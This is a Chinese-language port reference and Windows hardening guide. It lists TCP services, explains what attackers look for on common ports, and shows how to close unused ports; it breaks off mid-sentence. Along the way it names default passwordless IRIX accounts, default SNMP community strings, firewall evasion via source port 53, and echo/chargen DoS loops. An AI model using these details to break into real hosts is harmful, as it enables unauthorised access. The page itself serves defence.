Layer5741&#x2F;tcp ida-discover1 IDA Discover Port 15742&#x2F;tcp ida-discover2 IDA Discover Port 25745&#x2F;tcp fcopy-server fcopy-server5746&#x2F;tcp fcopys-server fcopys-server5755&#x2F;tcp openmailg OpenMail Desk Gateway server5757&#x2F;tcp x500ms OpenMail X.500 Directory Server5766&#x2F;tcp openmailns OpenMail NewMail Server5767&#x2F;tcp s-openmail OpenMail Suer Agent Layer (Secure)6000&#x2F;tcp x11 X Window System6110&#x2F;tcp softcm HP SoftBench CM6111&#x2F;tcp spc HP SoftBench Sub-Process Control6112&#x2F;tcp dtspcd dtspcd6123&#x2F;tcp backup-express Backup Express6141&#x2F;tcp meta-corp Meta Corporation License Manager6142&#x2F;tcp aspentec-lm Aspen Technology License Manager6143&#x2F;tcp watershed-lm Watershed License Manager6144&#x2F;tcp statsci1-lm StatSci License Manager - 16145&#x2F;tcp statsci2-lm StatSci License Manager - 26146&#x2F;tcp lonewolf-lm Lone Wolf Systems License Manager6147&#x2F;tcp montage-lm Montage License Manager6148&#x2F;tcp ricardo-lm Ricardo North America License Manager6149&#x2F;tcp tal-pod tal-pod6253&#x2F;tcp crip CRIP6389&#x2F;tcp clariion-evr01 clariion-evr016500&#x2F;tcp boks BoKS Master6558&#x2F;tcp xdsxdm6665&#x2F;tcp ircu IRCU6670&#x2F;tcp vocaltec-gold Vocaltec Global Online Directory6672&#x2F;tcp vision_server vision_server6673&#x2F;tcp vision_elmd vision_elmd6790&#x2F;tcp hnmp HNMP6831&#x2F;tcp ambit-lm ambit-lm6969&#x2F;tcp acmsoda acmsoda7010&#x2F;tcp ups-onlinet onlinet uninterruptable power supplies7020&#x2F;tcp dpserve DP Serve7070&#x2F;tcp arcp ARCP7099&#x2F;tcp lazy-ptop lazy-ptop7100&#x2F;tcp font-service X Font Service7121&#x2F;tcp virprot-lm Virtual Prototypes License Manager7174&#x2F;tcp clutild Clutild7200&#x2F;tcp fodms FODMS FLIP7201&#x2F;tcp dlip DLIP7395&#x2F;tcp winqedit winqedit7426&#x2F;tcp pmdmgr OpenView DM Postmaster Manager7430&#x2F;tcp xmpv7 OpenView DM xmpv7 api pipe7431&#x2F;tcp pmd OpenView DM ovc&#x2F;xmpv3 api pipe7491&#x2F;tcp telops-lmd telops-lmd7511&#x2F;tcp pafec-lm pafec-lm7544&#x2F;tcp nta-ds FlowAnalyzer DisplayServer7545&#x2F;tcp nta-us FlowAnalyzer UtilityServer7588&#x2F;tcp sun-lm Sun License Manager7777&#x2F;tcp cbt cbt7781&#x2F;tcp accu-lmgr accu-lmgr7932&#x2F;tcp t2-drm Tier 2 Data Resource Manager7933&#x2F;tcp t2-brm Tier 2 Business Rules Manager7999&#x2F;tcp irdmi2 iRDMI28000&#x2F;tcp irdmi iRDMI8032&#x2F;tcp pro-ed ProEd8400&#x2F;tcp cvd cvd8401&#x2F;tcp sabarsd sabarsd8402&#x2F;tcp abarsd abarsd8403&#x2F;tcp admind admind8450&#x2F;tcp npmp npmp8473&#x2F;tcp vp2p Vitual Point to Point8888&#x2F;tcp ddi-tcp-1 NewsEDGE server TCP (TCP 1)8889&#x2F;tcp ddi-tcp-2 Desktop Data TCP 18890&#x2F;tcp ddi-tcp-3 Desktop Data TCP 28891&#x2F;tcp ddi-tcp-4 Desktop Data TCP 3: NESS application8892&#x2F;tcp ddi-tcp-5 Desktop Data TCP 4: FARM product8893&#x2F;tcp ddi-tcp-6 Desktop Data TCP 5: NewsEDGE&#x2F;Web application8894&#x2F;tcp ddi-tcp-7 Desktop Data TCP 6: COAL application9000&#x2F;tcp cslistener CSlistener9006&#x2F;tcp sctp SCTP9090&#x2F;tcp websm WebSM9535&#x2F;tcp man9594&#x2F;tcp msgsys Message System9595&#x2F;tcp pds Ping Discovery Service9876&#x2F;tcp sd Session Director9992&#x2F;tcp palace Palace9993&#x2F;tcp palace Palace9994&#x2F;tcp palace Palace9995&#x2F;tcp palace Palace9996&#x2F;tcp palace Palace9997&#x2F;tcp palace Palace9998&#x2F;tcp distinct32 Distinct329999&#x2F;tcp distinct distinct10000&#x2F;tcp ndmp Network Data Management Protocol11000&#x2F;tcp irisa IRISA11001&#x2F;tcp metasys Metasys12753&#x2F;tcp tsaf tsaf port13160&#x2F;tcp i-zipqd I-ZIPQD13720&#x2F;tcp bprd BPRD Protocol (VERITAS NetBackup)13721&#x2F;tcp bpbrm BPBRM Protocol (VERITAS NetBackup)13782&#x2F;tcp bpcd VERITAS NetBackup17219&#x2F;tcp chipper Chipper18000&#x2F;tcp biimenu Beckman Instruments, Inc.19410&#x2F;tcp hp-sco hp-sco19411&#x2F;tcp hp-sca hp-sca19541&#x2F;tcp jcp JCP Client21845&#x2F;tcp webphone webphone21846&#x2F;tcp netspeak-is NetSpeak Corp. Directory Services21847&#x2F;tcp netspeak-cs NetSpeak Corp. Connection Services21848&#x2F;tcp netspeak-acd NetSpeak Corp. Automatic Call Distribution21849&#x2F;tcp netspeak-cps NetSpeak Corp. Credit Processing System22273&#x2F;tcp wnn6 wnn622555&#x2F;tcp vocaltec-wconf Vocaltec Web Conference22800&#x2F;tcp aws-brf Telerate Information Platform LAN22951&#x2F;tcp brf-gw Telerate Information Platform WAN24000&#x2F;tcp med-ltp med-ltp24004&#x2F;tcp med-ovw med-ovw24005&#x2F;tcp med-ci med-ci25000&#x2F;tcp icl-twobase1 icl-twobase125001&#x2F;tcp icl-twobase2 icl-twobase225002&#x2F;tcp icl-twobase3 icl-twobase325003&#x2F;tcp icl-twobase4 icl-twobase425004&#x2F;tcp icl-twobase5 icl-twobase525005&#x2F;tcp icl-twobase6 icl-twobase625006&#x2F;tcp icl-twobase7 icl-twobase725007&#x2F;tcp icl-twobase8 icl-twobase825008&#x2F;tcp icl-twobase9 icl-twobase925009&#x2F;tcp icl-twobase10 icl-twobase1025793&#x2F;tcp vocaltec-hos Vocaltec Address Server26000&#x2F;tcp quake quake26208&#x2F;tcp wnn6-ds wnn6-ds45678&#x2F;tcp eba EBA PRISE47557&#x2F;tcp dbbrowse Databeam Corporation47806&#x2F;tcp ap ALC Protocol47808&#x2F;tcp bacnet Building Automation and Control Networks\n0 通常用于分析操作系统。这一方法能够工作是因为在一些系统中“0”是无效端口，当你试图使用一种通常的闭合端口连接它时将产生不同的结果。一种典型的扫描：使用IP地址为0.0.0.0，设置ACK位并在以太网层广播。1　tcpmux　TCP Port Service Multiplexer　传输控制协议端口服务多路开关选择器2　compressnet　Management Utility　　 compressnet 管理实用程序3　compressnet　Compression Process　　 压缩进程5　rje　Remote Job Entry　　　　 远程作业登录7　echo　Echo　　　　　　 回显9　discard　Discard　　　　 丢弃11　systat　Active Users　　　　 在线用户13　daytime　Daytime　　　　　 时间17　qotd　Quote of the Day　　　 每日引用18　msp　Message Send Protocol　　　 消息发送协议19　chargen　Character Generator　　 字符发生器20　ftp-data　File Transfer[Default Data]　 文件传输协议(默认数据口)21　ftp　File Transfer[Control]　　　 文件传输协议(控制)22　ssh　SSH Remote Login Protocol　　 SSH远程登录协议23　telnet　Telnet　　　　 终端仿真协议24　any private mail system　　　 预留给个人用邮件系统25　smtp　Simple Mail Transfer　　　 简单邮件发送协议27　nsw-fe　NSW User System FE　　　 NSW 用户系统现场工程师29　msg-icp　MSG ICP　　　　　 MSG　ICP31　msg-auth　MSG Authentication　　 MSG验证33　dsp　Display Support Protocol　　 显示支持协议35　any private printer server　　 预留给个人打印机服务37　time　Time　　　　　　 时间38　rap　Route Access Protocol　　　 路由访问协议39　rlp　Resource Location Protocol　　 资源定位协议41　graphics　Graphics　　　　 图形42　nameserver　WINS Host Name Server　　 WINS 主机名服务43　nicname　Who Is　　　　 “绰号” who is服务44　mpm-flags　MPM FLAGS Protocol　　 MPM(消息处理模块)标志协议45　mpm　Message Processing Module [recv]　 消息处理模块46　mpm-snd　MPM [default send]　　　 消息处理模块(默认发送口)47　ni-ftp　NI FTP　　　　 NI FTP48 　auditd　Digital Audit Daemon　　 数码音频后台服务49　tacacs　Login Host Protocol (TACACS)　 TACACS登录主机协议50　re-mail-ck Remote Mail Checking Protocol　 远程邮件检查协议[未结束]51　la-maint　IMP Logical Address Maintenance　 IMP(接口信息处理机)逻辑地址维护52　xns-time　XNS Time Protocol　　　 施乐网络服务系统时间协议53　domain　Domain Name Server　　　 域名服务器54　xns-ch　XNS Clearinghouse　　　　 施乐网络服务系统票据交换 55　isi-gl　ISI Graphics Language　　 ISI图形语言56　xns-auth　XNS Authentication　　 施乐网络服务系统验证57　?　any private terminal access　　 预留个人用终端访问58　xns-mail　XNS Mail　　　　 施乐网络服务系统邮件59　any private file service　　　 预留个人文件服务60　Unassigned　　　　　 未定义61　ni-mail　NI MAIL　　　　　 NI邮件?62　acas　ACA Services　　　　 异步通讯适配器服务63　whois+ whois+　　　　　 WHOIS+64　covia　Communications Integrator (CI)　 通讯接口65　tacacs-ds　TACACS-Database Service　　 TACACS数据库服务66　sqlnet　Oracle SQLNET　　　 Oracle SQL*NET67　bootps　Bootstrap Protocol Server　　 引导程序协议服务端68　bootpc　Bootstrap Protocol Client　　 引导程序协议客户端69　tftp　Trivial File Transfer　　　 小型文件传输协议70　gopher　Gopher　　　　 信息检索协议71　netrjs-1　Remote Job Service　　 远程作业服务72　netrjs-2　Remote Job Service　　 远程作业服务73　netrjs-3　Remote Job Service　　 远程作业服务74　netrjs-4　Remote Job Service　　 远程作业服务75　any private dial out service　　 预留给个人拨出服务76 deos　Distributed External Object Store 分布式外部对象存储77　any private RJE service　　 　 预留给个人远程作业输入服务78　vettcp　vettcp　　　　 修正TCP?79　finger　Finger　　　　 查询远程主机在线用户等信息80　http　World Wide Web HTTP　　　　 全球信息网超文本传输协议 81　hosts2-ns　HOSTS2 Name Server　　 HOST2名称服务82　xfer　XFER Utility　　　　 传输实用程序83　mit-ml-dev　MIT ML Device　　　　 模块化智能终端ML设备84　ctf　Common Trace Facility　　　 公用追踪设备85　mit-ml-dev　MIT ML Device　　　　 模块化智能终端ML设备86　mfcobol　Micro Focus Cobol　　　 Micro Focus Cobol编程语言87　any private terminal link　　 预留给个人终端连接88　kerberos　Kerberos　　　　 Kerberros安全认证系统89　su-mit-tg　SU&#x2F;MIT Telnet Gateway　　 SU&#x2F;MIT终端仿真网关90　dnsix　DNSIX Securit Attribute Token Map　 DNSIX 安全属性标记图91　mit-dov　MIT Dover Spooler　　　 MIT Dover假脱机92　npp　Network Printing Protocol　　 网络打印协议93　dcp　Device Control Protocol　　 设备控制协议94　objcall　Tivoli Object Dispatcher　　 Tivoli对象调度95　supdup　 SUPDUP96　dixie　DIXIE Protocol Specification　　 DIXIE协议规范97　swift-rvf（Swift Remote Virtural File Protocol）快速远程虚拟文件协议98　tacnews　TAC News　　　　　 TAC新闻协议\n1 tcpmux 这显示有人在寻找SGI Irix机器。Irix是实现tcpmux的主要提供者，缺省情况下tcpmux在这种系统中被打开。Iris机器在发布时含有几个缺省的无密码的帐户， 如lp, guest, uucp, nuucp, demos, tutor, diag, EZsetup, OutOfBox, 和4Dgifts。许多管理员安装后忘记删除这些帐户。因此Hacker们在Internet上搜索tcpmux并利用这些帐户。\n7 Echo 你能看到许多人们搜索Fraggle放大器时，发送到x.x.x.0和x.x.x.255的信息。常见的一种DoS攻击是echo循环（echo- loop），攻击者伪造从一个机器发送到另一个机器的UDP数据包，而两个机器分别以它们最快的方式回应这些数据包。另一种东西是由 DoubleClick在词端口建立的TCP连接。有一种产品叫做“Resonate Global Dispatch”，它与DNS的这一端口连接以确定最近的路由。Harvest&#x2F;squid cache将从3130端口发送UDP echo：“如果将cache的source_ping on选项打开，它将对原始主机的UDP echo端口回应一个HIT reply。”这将会产生许多这类数据包。\n11 sysstat 这是一种UNIX服务，它会列出机器上所有正在运行的进程以及是什么启动了这些进程。这为入侵者提供了许多信息而威胁机器的安全，如暴露已知某些弱点或帐 户的程序。这与UNIX系统中“ps”命令的结果相似。再说一遍：ICMP没有端口，ICMP port 11通常是ICMP type&#x3D;11。\n19 chargen 这是一种仅仅发送字符的服务。UDP版本将会在收到UDP包后回应含有垃圾字符的包。TCP连接时，会发送含有垃圾字符的数据流知道连接关闭。 Hacker利用IP欺骗可以发动DoS攻击。伪造两个chargen服务器之间的UDP包。由于服务器企图回应两个服务器之间的无限的往返数据通讯一个 chargen和echo将导致服务器过载。同样fraggle DoS攻击向目标地址的这个端口广播一个带有伪造受害者IP的数据包，受害者为了回应这些数据而过载。\n21 ftp 最常见的攻击者用于寻找打开“anonymous”的ftp服务器的方法。这些服务器带有可读写的目录。Hackers或Crackers 利用这些服务器作为传送warez (私有程序) 和pr0n(故意拼错词而避免被搜索引擎分类)的节点。\n22 ssh PcAnywhere 建立TCP和这一端口的连接可能是为了寻找ssh。这一服务有许多弱点。如果配置成特定的模式，许多使用RSAREF库的版本有不少漏洞。（建议在其它端 口运行ssh）。还应该注意的是ssh工具包带有一个称为make-ssh-known-hosts的程序。它会扫描整个域的ssh主机。你有时会被使用 这一程序的人无意中扫描到。UDP（而不是TCP）与另一端的5632端口相连意味着存在搜索pcAnywhere的扫描。5632（十六进制的 0x1600）位交换后是0x0016（使进制的22）。\n23 Telnet 入侵者在搜索远程登陆UNIX的服务。大多数情况下入侵者扫描这一端口是为了找到机器运行的操作系统。此外使用其它技术，入侵者会找到密码。\n25 smtp 攻击者（spammer）寻找SMTP服务器是为了传递他们的spam。入侵者的帐户总被关闭，他们需要拨号连接到高带宽的e-mail服务器上，将简单 的信息传递到不同的地址。SMTP服务器（尤其是sendmail）是进入系统的最常用方法之一，因为它们必须完整的暴露于Internet且邮件的路由 是复杂的（暴露+复杂&#x3D;弱点）。\n53 DNS Hacker或crackers可能是试图进行区域传递（TCP），欺骗DNS（UDP）或隐藏其它通讯。因此防火墙常常过滤或记录53端口。需要注意的 是你常会看到53端口做为UDP源端口。不稳定的防火墙通常允许这种通讯并假设这是对DNS查询的回复。Hacker常使用这种方法穿透防火墙。\n67&amp;68 Bootp和DHCP UDP上的Bootp&#x2F;DHCP：通过DSL和cable-modem的防火墙常会看见大量发送到广播地址255.255.255.255的数据。这些机 器在向DHCP服务器请求一个地址分配。Hacker常进入它们分配一个地址把自己作为局部路由器而发起大量的“中间人”（man-in-middle） 攻击。客户端向68端口（bootps）广播请求配置，服务器向67端口（bootpc）广播回应请求。这种回应使用广播是因为客户端还不知道可以发送的 IP地址。\n69 TFTP(UDP) 许多服务器与bootp一起提供这项服务，便于从系统下载启动代码。但是它们常常错误配置而从系统提供任何文件，如密码文件。它们也可用于向系统写入文件。\n79 finger Hacker用于获得用户信息，查询操作系统，探测已知的缓冲区溢出错误，回应从自己机器到其它机器finger扫描。\n80 web站点默认80为服务端口，采用tcp或udp协议。\n98 linuxconf 这个程序提供Linux?boxen的简单管理。通过整合的HTTP服务器在98端口提供基于Web界面的服务。它已发现有许多安全问题。一些版本setuid root，信任局域网，在&#x2F;tmp下建立Internet可访问的文件，LANG环境变量有缓冲区溢出。此外因为它包含整合的服务器，许多典型的HTTP 漏洞可能存在（缓冲区溢出，历遍目录等）\n109 POP2 并不象POP3那样有名，但许多服务器同时提供两种服务（向后兼容）。在同一个服务器上POP3的漏洞在POP2中同样存在。\n110 POP3 用于客户端访问服务器端的邮件服务。POP3服务有许多公认的弱点。关于用户名和密码交换缓冲区溢出的弱点至少有20个（这意味着Hacker可以在真正登陆前进入系统）。成功登陆后还有其它缓冲区溢出错误。\n111 sunrpc portmap rpcbind Sun RPC PortMapper&#x2F;RPCBIND。访问portmapper是扫描系统查看允许哪些RPC服务的最早的一步。常见RPC服务 有：rpc.mountd, NFS, rpc.statd, rpc.csmd, rpc.ttybd, amd等。入侵者发现了允许的RPC服务将转向提供服务的特定端口测试漏洞。记住一定要记录线路中的daemon, IDS, 或sniffer，你可以发现入侵者正使用什么程序访问以便发现到底发生了什么。\n113 Ident auth 这是一个许多机器上运行的协议，用于鉴别TCP连接的用户。使用标准的这种服务可以获得许多机器的信息（会被Hacker利用）。但是它可作为许多服务的 记录器，尤其是FTP, POP, IMAP, SMTP和IRC等服务。通常如果有许多客户通过防火墙访问这些服务，你将会看到许多这个端口的连接请求。记住，如果你阻断这个端口客户端会感觉到在防火 墙另一边与e-mail服务器的缓慢连接。许多防火墙支持在TCP连接的阻断过程中发回RST，着将回停止这一缓慢的连接。\n119 NNTP news 新闻组传输协议，承载USENET通讯。当你链接到诸如：news:&#x2F;&#x2F;comp.security.firewalls&#x2F;.?的地址时通常使用这个端口。这个端口的连接企图通常是人们在寻找USENET服务器。多数ISP限制只有他们的客户才能访问他们的新闻组服务器。打开新闻组服务器将允许发&#x2F;读任何人的帖子，访问被限制的新闻组服务器，匿名发帖或发送spam。\n135 oc-serv MS RPC end-point mapper Microsoft在这个端口运行DCE RPC end-point mapper为它的DCOM服务。这与UNIX 111端口的功能很相似。使用DCOM和&#x2F;或RPC的服务利用机器上的end-point mapper注册它们的位置。远端客户连接到机器时，它们查询end-point mapper找到服务的位置。同样Hacker扫描机器的这个端口是为了找到诸如：这个机器上运行Exchange Server吗？是什么版本？这个端口除了被用来查询服务（如使用epdump）还可以被用于直接攻击。有一些DoS攻击直接针对这个端口。\n137 NetBIOS name service nbtstat (UDP) 这是防火墙管理员最常见的信息。\n139 NetBIOS File and Print Sharing 通过这个端口进入的连接试图获得NetBIOS&#x2F;SMB服务。这个协议被用于Windows“文件和打印机共享”和SAMBA。在Internet上共享 自己的硬盘是可能是最常见的问题。大量针对这一端口始于1999，后来逐渐变少。2000年又有回升。一些VBS（IE5 VisualBasic Scripting）开始将它们自己拷贝到这个端口，试图在这个端口繁殖。\n143 IMAP 和上面POP3的安全问题一样，许多IMAP服务器有缓冲区溢出漏洞运行登陆过程中进入。记住：一种linux蠕虫（admw0rm）会通过这个端口繁 殖，因此许多这个端口的扫描来自不知情的已被感染的用户。当RadHat在他们的Linux发布版本中默认允许IMAP后，这些漏洞变得流行起来。 Morris蠕虫以后这还是第一次广泛传播的蠕虫。这一端口还被用于IMAP2，但并不流行。已有一些报道发现有些0到143端口的攻击源于脚本。\n161 SNMP(UDP) 入侵者常探测的端口。SNMP允许远程管理设备。所有配置和运行信息都储存在数据库中，通过SNMP客获得这些信息。许多管理员错误配置将它们暴露于 Internet。Crackers将试图使用缺省的密码“public”“private”访问系统。他们可能会试验所有可能的组合。SNMP包可能会 被错误的指向你的网络。Windows机器常会因为错误配置将HP JetDirect remote management软件使用SNMP。HP OBJECT IDENTIFIER将收到SNMP包。新版的Win98使用SNMP解析域名，你会看见这种包在子网内广播（cable modem, DSL）查询sysName和其它信息。\n162 SNMP trap 可能是由于错误配置\n177 xdmcp 许多Hacker通过它访问X-Windows控制台， 它同时需要打开6000端口。\n513 rwho 可能是从使用cable modem或DSL登陆到的子网中的UNIX机器发出的广播。这些人为Hacker进入他们的系统提供了很有趣的信息。\n553 CORBA IIOP (UDP) 如果你使用cable modem或DSL VLAN，你将会看到这个端口的广播。CORBA是一种面向对象的RPC（remote procedure call）系统。Hacker会利用这些信息进入系统。\n600 Pcserver backdoor 请查看1524端口。一些玩script的孩子认为他们通过修改ingreslock和pcserver文件已经完全攻破了系统– Alan J. Rosenthal.\n635 mountd Linux的mountd Bug。这是人们扫描的一个流行的Bug。大多数对这个端口的扫描是基于UDP的，但基于TCP的mountd有所增加（mountd同时运行于两个端 口）。记住，mountd可运行于任何端口（到底在哪个端口，需要在端口111做portmap查询），只是Linux默认为635端口，就象NFS通常 运行于2049端口。\n1024 许多人问这个端口是干什么的。它是动态端口的开始。许多程序并不在乎用哪个端口连接网络，它们请求操作系统为它们分配“下一个闲置端口”。基于这一点分配 从端口1024开始。这意味着第一个向系统请求分配动态端口的程序将被分配端口1024。为了验证这一点，你可以重启机器，打开Telnet，再打开一个 窗口运行“natstat -a”，你将会看到Telnet被分配1024端口。请求的程序越多，动态端口也越多。操作系统分配的端口将逐渐变大。再来一遍，当你浏览Web页时用 “netstat”查看，每个Web页需要一个新端口。\n1025，1026 参见1024\n1080 SOCKS 这一协议以管道方式穿过防火墙，允许防火墙后面的许多人通过一个IP地址访问Internet。理论上它应该只允许内部的通信向外达到Internet。 但是由于错误的配置，它会允许Hacker&#x2F;Cracker的位于防火墙外部的攻击穿过防火墙。或者简单地回应位于Internet上的计算机，从而掩饰 他们对你的直接攻击。WinGate是一种常见的Windows个人防火墙，常会发生上述的错误配置。在加入IRC聊天室时常会看到这种情况。\n1114 SQL 系统本身很少扫描这个端口，但常常是sscan脚本的一部分。\n1243 Sub-7木马（TCP）\n1524 ingreslock 后门许多攻击脚本将安装一个后门Shell于这个端口（尤其是那些针对Sun系统中sendmail和RPC服务漏洞的脚本，如statd, ttdbserver和cmsd）。如果你刚刚安装了你的防火墙就看到在这个端口上的连接企图，很可能是上述原因。你可以试试Telnet到你的机器上的 这个端口，看看它是否会给你一个Shell。连接到600&#x2F;pcserver也存在这个问题。\n2049 NFS NFS程序常运行于这个端口。通常需要访问portmapper查询这个服务运行于哪个端口，但是大部分情况是安装后NFS运行于这个端口，Hacker&#x2F;Cracker因而可以闭开portmapper直接测试这个端口。\n3128 squid 这是Squid HTTP代理服务器的默认端口。攻击者扫描这个端口是为了搜寻一个代理服务器而匿名访问Internet。你也会看到搜索其它代理服务器的端 口：8000&#x2F;8001&#x2F;8080&#x2F;8888。扫描这一端口的另一原因是：用户正在进入聊天室。其它用户（或服务器本身）也会检验这个端口以确定用户的机 器是否支持代理。\n5632 pcAnywere 你会看到很多这个端口的扫描，这依赖于你所在的位置。当用户打开pcAnywere时，它会自动扫描局域网C类网以寻找可能得代理（译者：指agent而 不是proxy）。Hacker&#x2F;cracker也会寻找开放这种服务的机器，所以应该查看这种扫描的源地址。一些搜寻pcAnywere的扫描常包含端 口22的UDP数据包。\n6776 Sub-7 artifact 这个端口是从Sub-7主端口分离出来的用于传送数据的端口。例如当控制者通过电话线控制另一台机器，而被控机器挂断时你将会看到这种情况。因此当另一人 以此IP拨入时，他们将会看到持续的，在这个端口的连接企图。（译者：即看到防火墙报告这一端口的连接企图时，并不表示你已被Sub-7控制。）\n6970 RealAudio RealAudio客户将从服务器的6970-7170的UDP端口接收音频数据流。这是由TCP7070端口外向控制连接设置的。\n13223 PowWow PowWow 是Tribal Voice的聊天程序。它允许用户在此端口打开私人聊天的连接。这一程序对于建立连接非常具有“进攻性”。它会“驻扎”在这一TCP端口等待回应。这造成 类似心跳间隔的连接企图。如果你是一个拨号用户，从另一个聊天者手中“继承”了IP地址这种情况就会发生：好象很多不同的人在测试这一端口。这一协议使用 “OPNG”作为其连接企图的前四个字节。\n17027 Conducent 这是一个外向连接。这是由于公司内部有人安装了带有Conducent “adbot” 的共享软件。Conducent “adbot”是为共享软件显示广告服务的。使用这种服务的一种流行的软件是Pkware。有人试验：阻断这一外向连接不会有任何问题，但是封掉IP地址 本身将会导致adbots持续在每秒内试图连接多次而导致连接过载：机器会不断试图解析DNS名—ads.conducent.com，即IP 地址216.33.210.40 ；216.33.199.77 ；216.33.199.80 ；216.33.199.81；216.33.210.41。（译者：不知NetAnts使用的Radiate是否也有这种现象）\n27374 Sub-7木马(TCP)\n30100 NetSphere木马(TCP) 通常这一端口的扫描是为了寻找中了NetSphere木马。\n31337 Back Orifice “elite” Hacker中31337读做“elite”&#x2F;ei’li:t&#x2F;（译者：法语，译为中坚力量，精华。即3&#x3D;E, 1&#x3D;L, 7&#x3D;T）。因此许多后门程序运行于这一端口。其中最有名的是Back Orifice。曾经一段时间内这是Internet上最常见的扫描。现在它的流行越来越少，其它的木马程序越来越流行。\n31789 Hack-a-tack 这一端口的UDP通讯通常是由于”Hack-a-tack”远程访问木马（RAT, Remote Access Trojan）。这种木马包含内置的31790端口扫描器，因此任何31789端口到317890端口的连接意味着已经有这种入侵。（31789端口是控 制连接，317890端口是文件传输连接）\n32770~32900 RPC服务 Sun Solaris的RPC服务在这一范围内。详细的说：早期版本的Solaris（2.5.1之前）将portmapper置于这一范围内，即使低端口被防 火墙封闭仍然允许Hacker&#x2F;cracker访问这一端口。扫描这一范围内的端口不是为了寻找portmapper，就是为了寻找可被攻击的已知的 RPC服务。\n33434~33600 traceroute 如果你看到这一端口范围内的UDP数据包（且只在此范围之内）则可能是由于traceroute。\n限制端口防非法入侵一般来说，我们采用一些功能强大的反黑软件和防火墙来保证我们的系统安全，本文拟用一种简易的办法——通过限制端口来帮助大家防止非法入侵。\n　　非法入侵的方式　　简单说来，非法入侵的方式可粗略分为4种：　　1、扫描端口，通过已知的系统Bug攻入主机。　　2、种植木马，利用木马开辟的后门进入主机。　　3、采用数据溢出的手段，迫使主机提供后门进入主机。　　4、利用某些软件设计的漏洞，直接或间接控制主机。\n　　非法入侵的主要方式是前两种，尤其是利用一些流行的黑客工具，通过第一种方式攻击主机的情况最多、也最普遍；而对后两种方式来说，只有一些手段高超的黑客才利用，波及面并不广泛，而且只要这两种问题一出现，软件服务商很快就会提供补丁，及时修复系统。\n因此，如果能限制前两种非法入侵方式，就能有效防止利用黑客工具的非法入侵。而且前两种非法入侵方式有一个共同点，就是通过端口进入主机。\n端口就像一所房子（服务器）的几个门一样，不同的门通向不同的房间（服务器提供的不同服务）。我们常用的FTP默认端口为21，而WWW网页一般默认端 口是80。但是有些马虎的网络管理员常常打开一些容易被侵入的端口服务，比如139等；还有一些木马程序，比如冰河、BO、广外等都是自动开辟一个您不察 觉的端口。那么，只要我们把自己用不到的端口全部封锁起来，不就杜绝了这两种非法入侵吗？\n限制端口的方法　　对于个人用户来说，您可以限制所有的端口，因为您根本不必让您的机器对外提供任何服务；而对于对外提供网络服务的服务器，我们需把必须利用的端口（比如WWW端口80、FTP端口21、邮件服务端口25、110等）开放，其他的端口则全部关闭。\n　　这里，对于采用Windows 2000或者Windows XP的用户来说，不需要安装任何其他软件，可以利用“TCP&#x2F;IP筛选”功能限制服务器的端口。具体设置如下：\n　　1、右键点击“网上邻居”，选择“属性”，然后双击“本地连接”（如果是拨号上网用户，选择“我的连接”图标），弹出“本地连接状态”对话框。\n　　2、点击[属性]按钮，弹出“本地连接 属性”，选择“此连接使用下列项目”中的“Internet协议（TCP&#x2F;IP）”，然后点击[属性]按钮。\n　　3、在弹出的“Internet协议（TCP&#x2F;IP）”对话框中点击[高级]按钮。在弹出的“高级TCP&#x2F;IP 设置”中，选择“选项”标签，选中“TCP&#x2F;IP筛选”，然后点击[属性]按钮。\n　　4、在弹出的“TCP&#x2F;IP筛选”对话框里选择“启用TCP&#x2F;IP筛选”的复选框，然后把左边“TCP端口”上的“只允许”选上。\n每一项服务都对应相应的端口，比如众如周知的WWW服务的端口是80，smtp是25，ftp是21，win2000安装中默认的都是这些服务开启的。对于个人用户来说确实没有必要，关掉端口也就是关闭无用的服务。\n“控制面板”的“管理工具”中的“服务”中来配置。\n1、关闭7.9等等端口：关闭Simple TCP&#x2F;IP Service,支持以下TCP&#x2F;IP服务：Character Generator,Daytime, Discard, Echo, 以及 Quote of the Day。\n2、关闭80口：关掉WWW服务。在“服务”中显示名称为”World Wide Web Publishing Service”，通过 Internet 信息服务的管理单元提供 Web 连接和管理。\n3、关掉25端口：关闭Simple Mail Transport Protocol (SMTP)服务，它提供的功能是跨网传送电子邮件。\n4、关掉21端口：关闭FTP Publishing Service,它提供的服务是通过 Internet 信息服务的管理单元提供 FTP 连接和管理。\n5、关掉23端口：关闭Telnet服务，它允许远程用户登录到系统并且使用命令行运行控制台程序。\n6、还有一个很重要的就是关闭server服务，此服务提供RPC支持、文件、打印以及命名管道共享。关掉它就关掉了win2k的默认共享，比如ipc$、c$、admin$等等，此服务关闭不影响您的其他操作。\n7、还有一个就是139端口，139端口是NetBIOS　Session端口，用来文件和打印共享，注意的是运行samba的unix机器也开放了139端口，功能一样。以前流光2000用来判断对方主机类型不太准确，估计就是139端口开放既认为是NT机，现在好了。\n关闭139口的方法是在“网络和拨号连接”中“本地连接”中选取“Internet协议(TCP&#x2F;IP)”属性，进入“高级TCP&#x2F;IP设置”“WINS设置”里面有一项“禁用TCP&#x2F;IP的NETBIOS”，打勾就关闭了139端口。\n对于个人用户来说，可以在各项服务属性设置中设为“禁用”，以免下次重启服务也重新启动，端口也开放了。\n谨防黑客通过“端口扫描”进行攻击\n黑客的探测方式里除了侦察IP，还有一项——端口扫描。通过“端口扫描”可以知道被扫描的计算机哪些服务、端口是打开而没有被使用的(可以理解为寻找通往计算机的通道)。\n一、端口扫描\n网上很容易找到远程端口扫描的工具，如Superscan、IP Scanner、Fluxay(流光)等，这就是用“流光”对试验主机192.168.1.8进行端口扫描后的结果。从中我们可以清楚地了解，该主机的哪些非常用端口是打开的；是否支持FTP、Web服务；且FTP服务是否支持“匿名”，以及IIS版本，是否有可以被成功攻破的IIS漏洞也显示出来。\n二、阻止端口扫描防范端口扫描的方法有两个：1.关闭闲置和有潜在危险的端口\n这个方法有些“死板”，它的本质是——将所有用户需要用到的正常计算机端口外的其他端口都关闭掉。因为就黑客而言，所有的端口都可能成为攻击的目标。换 句话说“计算机的所有对外通讯的端口都存在潜在的危险”，而一些系统必要的通讯端口，如访问网页需要的HTTP(80端口)；QQ(4000端口)等不能 被关闭。\n在Windows NT核心系统(Windows 2000&#x2F;XP&#x2F; 2003)中要关闭掉一些闲置端口是比较方便的，可以采用“定向关闭指定服务的端口”和“只开放允许端口的方式”。计算机的一些网络服务会有系统分配默认 的端口，将一些闲置的服务关闭掉，其对应的端口也会被关闭了(如图2)。进入“控制面板”、“管理工具”、“服务”项内，关闭掉计算机的一些没有使用的服 务(如FTP服务、DNS服务、IIS Admin服务等等)，它们对应的端口也被停用了。至于“只开放允许端口的方式”，可以利用系统的“TCP&#x2F;IP筛选”功能实现，设置的时候，“只允许” 